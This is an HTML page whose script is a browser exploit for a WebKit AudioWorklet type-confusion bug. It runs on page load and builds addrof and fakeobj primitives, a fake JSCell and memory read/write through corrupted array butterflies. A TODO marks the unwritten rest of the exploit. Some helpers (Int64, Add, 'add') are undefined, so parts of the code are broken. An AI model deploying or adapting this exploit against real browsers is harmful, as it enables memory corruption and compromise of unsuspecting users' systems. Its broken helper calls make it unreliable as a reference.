<html>
  <head>
    <script>
      function log(s) {
        document.body.innerText += s + "\n";
      }
      var keep = [];
      async function start() {
        log("starting...")
        var context = new OfflineAudioContext(1, 128, 300000);
        context.audioWorklet.addModule(URL.createObjectURL(new Blob([`

          // constant added to double JSValues
          const kBoxedDoubleOffset = 0x0002000000000000n;
          function boxDouble(d) {
            return d + kBoxedDoubleOffset;
          }
          function unboxDouble(d) {
            return d - kBoxedDoubleOffset;
          }
          // the structure ID is wrong, but we'll fix it :)
          let doubleArrayCellHeader = 0x0108230700000000n;
          let f = new Float64Array(1);
          let u = new Uint32Array(f.buffer);
          function float2bigint(v) {
            f[0] = v;
            return BigInt(u[0]) | (BigInt(u[1]) << 32n);
          }
          function bigint2float(v) {
            u[0] = Number(v & 0xffffffffn);
            u[1] = Number(v >> 32n);
            return f[0];
          }

          // store things to prevent GC
          let keep = [];
          function gc(n=10000) {
            let tmp = [];
            for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
          }

          // message port to talk to main thread; will be set later
          let port = null;

          // will be implemented later
          let fakeobj = null;
          let addrof = null;

          for (var i = 0; i < 100; i++) keep.push([1.1*i]);
          let a0 = [0,0,0,0,0,0,0,0,0,0];
          let a1 = [0,0,0,0,0,0,0,0,0,0];
          // transition to unboxed double storage
          a1[3] = 13.37;
          let b0 = [0,0,0,0,0,0,0,0,0,0];
          let b1 = [0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array

          // put zeroes in first two slots so JSCallbackData destruction is safe
          delete b1[0];
          delete b1[1];

          function setupPrimitives() {
            port.postMessage("setting up");
            if (a1.length != 0x1337) {
              port.postMessage("Failure on array length");
              return;
            }

            const kSentinel = 1333.337;
            let offset = -1;

            b1[0] = kSentinel;
            // scan for the sentinel to find the offset from a to b
            for (var i = 0; i < 0x100; i++) {
              if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
                offset = i;
                break;
              }
            }
            if (offset == -1) {
              port.postMessage("Failure finding offset");
              return;
            }

            // temporary implementations
            addrof = (val) => {
              b1[0] = val;
              return float2bigint(a1[offset]);
            }
            fakeobj = (addr) => {
              a1[offset] = bigint2float(addr);
              return b1[0];
            }
            port.postMessage("addrof and fakeobj done");
var print = (msg) => {
    port.postMessage(msg);
}
            // from saelo: spray structures to be able to predict their IDs.
    // from Auxy: I am not sure about why spraying. i change the code to:
    //
     var structs = []
     var i = 0;
     var abc = [13.37];
     abc.pointer = 1234;
     abc['prop' + i] = 13.37;
     structs.push(abc);
     var victim = structs[0];
    //
    // and the payload still work stablely. It seems this action is redundant
    /*var structs = []
    for (var i = 0; i < 0x1000; ++i) {
        var array = [13.37];
        array.pointer = 1234;
        array['prop' + i] = 13.37;
        structs.push(array);
    }*/

    // take an array from somewhere in the middle so it is preceeded by non-null bytes which
    // will later be treated as the butterfly length.
    //var victim = structs[0x800];
    print("[+] victim @"+addrof(victim));

    // craft a fake object to modify victim
    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
    var container = {
        header: flags_double_array,
        butterfly: victim
    };

    // create object having |victim| as butterfly.
    var containerAddr = addrof(container);
    print("[+] container @"+containerAddr);
    // add the offset to let compiler recognize fake structure
    var hax = fakeobj(Add(containerAddr, 0x10));
    // origButterfly is now based on the offset of **victim** 
    // because it becomes the new butterfly pointer
    // and hax[1] === victim.pointer
    var origButterfly = hax[1];

    var memory = {
        addrof: addrof,
        fakeobj: fakeobj,

        // Write an int64 to the given address.
        writeInt64(addr, int64) {
            hax[1] = bigint2float(addr+0x10);
            victim.pointer = int64;
        },

        /*// Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
        write16(addr, value) {
            // Set butterfly of victim object and dereference.
            hax[1] = Add(addr, 0x10).asDouble();
            victim.pointer = value;
        },

        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
        write(addr, data) {
            while (data.length % 4 != 0)
                data.push(0);

            var bytes = new Uint8Array(data);
            var ints = new Uint16Array(bytes.buffer);

            for (var i = 0; i < ints.length; i++)
                this.write16(Add(addr, 2 * i), ints[i]);
        },*/

        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
        /*read64(addr) {
            // Set butterfly of victim object and dereference.
            hax[1] = Add(addr, 0x10).asDouble();
            return this.addrof(victim.pointer);
        },*/
        read16(addr) {
            hax[1] = bigint2float(add+0x10);
            return victim.pointer;
        },
        read: function(addrObj, length) {
                //var offset = 0;
                //var writer = this.create_writer(addrObj);
                var arr = new Uint8Array(length);
                for (var i = 0; i < length; i++) {
                    arr[i] = this.read16(addrObj + i);
                }
                return arr;
            },

        /*// Verify that memory read and write primitives work.
        test() {
            var v = {};
            var obj = {p: v};

            var addr = this.addrof(obj);
            assert(this.fakeobj(addr).p == v, "addrof and/or fakeobj does not work");

            var propertyAddr = Add(addr, 0x10);

            var value = this.read64(propertyAddr);
            assert(value.asDouble() == addrof(v).asDouble(), "read64 does not work");

            this.write16(propertyAddr, 0x1337);
            assert(obj.p == 0x1337, "write16 does not work");
        },*/
    };

    // Testing code, not related to exploit
    var plainObj = {};
    var header = memory.read16(addrof(plainObj));
    memory.writeInt64(memory.addrof(container), header);
    //memory.test();
    print("[+] limited memory read/write working");
          }

          function pwn() {
            try {
              setupPrimitives();

              // ensure we can survive GC
              gc();

              // TODO: rest of exploit goes here

              port.postMessage("done!");
            } catch(e) { // send exception strings to main thread (for debugging)
              port.postMessage("Exception!!");
              port.postMessage(e.toString());
            }
          }

          registerProcessor("a", class {
            constructor() {
              // setup a message port to the main thread
              port = new AudioWorkletProcessor().port;
              port.onmessage = pwn;

              // this part is magic
              // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
              eval('1 + 0x1336');

              // overwrite a1's butterfly with a fastMalloc pointer
              return {fill: 1, a: a0};
            }
          });
          registerProcessor("b", class {
            constructor() {
              // overwrite b1's butterfly with a fastMalloc pointer
              return {fill: 1, b: b0};
            }
          });
        `], {type: "text/javascript"}))).then(async () => {
          var wa = new AudioWorkletNode(context, "a");
          var wb = new AudioWorkletNode(context, "b");
          wa.port.onmessage = (e) => { log(e.data); console.log(e.data) }
          await (new Promise((res) => setTimeout(res, 100)));
          wa.port.postMessage("pwn");
        });
      }
    </script>
  </head>
  <body onload="start()">
  </body>
</html>

